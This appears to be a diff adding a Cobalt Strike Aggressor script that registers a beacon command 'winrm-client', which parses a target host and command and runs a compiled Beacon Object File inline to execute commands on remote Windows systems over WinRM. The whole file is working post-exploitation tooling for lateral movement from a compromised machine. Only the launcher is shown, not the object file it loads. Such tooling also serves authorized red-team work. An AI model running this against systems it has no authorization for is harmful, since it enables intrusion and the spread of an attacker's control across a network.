@@ -1,0 +1,57 @@
+beacon_command_register(
+"winrm-client",
+"Use WinRM to execute commands on other systems",
+"usage: winrm-client --host <hostname> --cmd <command> \
+Options:
+    --host      <hostname>  Name or IP
+    --cmd       <command>   Command to execute
+");
+alias winrm-client
+{
+    local('$bid $cmd $host $handle $data $args');
+
+    $bid = $1;
+
+    # defaults
+
+    for ($i = 1; $i < size(@_); $i++)
+    {
+        if (@_[$i] eq "--cmd")
+        {
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing --cmd value");
+                return;
+            }
+            $cmd = @_[$i];
+        }
+        else if (@_[$i] eq "--host")
+        {
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing --host value");
+                return;
+            }
+            $host = @_[$i];
+        }
+    }
+    if ($host eq $null){
+        berror($1, "need to pass --host");
+        return;
+    }
+    if ($cmd eq $null){
+        berror($1, "need to pass --cmd");
+        return;
+    }
+    $handle = openf(script_resource("x64/Release/bof.x64.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "ZZ", $host, $cmd);
+
+    # Execute BOF
+    beacon_inline_execute($bid, $data, "go", $args);
+}
